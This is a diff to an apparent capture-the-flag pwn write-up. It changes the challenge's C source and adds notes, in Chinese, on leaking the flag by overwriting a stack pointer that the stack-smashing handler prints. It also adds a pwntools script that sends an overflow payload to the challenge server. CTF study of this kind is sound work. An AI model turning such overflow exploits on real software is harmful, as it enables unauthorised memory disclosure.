@@ -11,11 +11,15 @@ tag: `pwn`
 #include <fcntl.h>
 
 int main() {
+
+    setvbuf(stdin, 0, _IONBF, 0);
+    setvbuf(stdout, 0, _IONBF, 0);
+
     void *stage;
     int AVEmujica;
     char your_input[16];
 
-    AVEmujica = open("./flag", O_RDONLY);
+    AVEmujica = open("/home/chal/flag", O_RDONLY);
     printf("=====================================================\n");
     printf("…ようこそ。Ave Mujica の世界へ\n");
     printf("=====================================================\n");
@@ -81,3 +85,17 @@ __fortify_fail (const char *msg)
 					   
 這是一個在stack上的一個pointer，這裡會印出他指向位置上的值					   
 結合buffer overflow，如果我們能一直往下蓋，把該pointer蓋成flag的位置，就可以透過stack smashing去leak出flag了
+
+
+## script
+```python
+from pwn import *
+
+r=remote("cha-thjcc.scint.org",10100)
+
+r.recvuntil(b"Where is AVE Mujica: ")
+address = int(r.recvline().strip(),16)
+r.sendline(b'a'*0x10+p64(address)*200)
+
+r.interactive()
+```
